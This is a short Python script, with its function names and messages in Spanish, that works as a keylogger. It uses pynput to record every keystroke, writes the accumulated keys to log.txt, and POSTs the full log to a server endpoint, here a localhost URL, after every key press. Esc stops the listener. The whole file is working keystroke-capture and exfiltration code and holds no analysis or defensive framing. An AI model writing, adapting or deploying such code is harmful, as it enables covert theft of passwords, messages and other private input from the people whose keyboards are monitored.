import requests
from pynput.keyboard import Key, Listener

server_url = "http://localhost:8080/log"

keys = []


def presionar_tecla(key):
    keys.append(key)
    convertir_string(keys)


def convertir_string(keys):
    with open("log.txt", "w+") as logfile:
        for key in keys:
            key = str(key).replace("'", "")
            logfile.write(key)

        # After writing the keys to the file, read the contents of the file and send it to the server
        logfile.seek(0)
        contents = logfile.read()
        enviar_datos(contents)


def enviar_datos(datos):
    try:
        # POST the data to the server
        response = requests.post(server_url, data=datos)
        if response.status_code == 200:
            print("Datos enviados correctamente")
        else:
            print(
                f"Error al enviar datos al servidor. Código de respuesta: {response.status_code}"
            )
    except requests.exceptions.RequestException as e:
        print(f"No se pudo conectar con el servidor: {e}")


def soltar_tecla(key):
    if key == Key.esc:
        return False


with Listener(on_press=presionar_tecla, on_release=soltar_tecla) as listener:
    listener.join()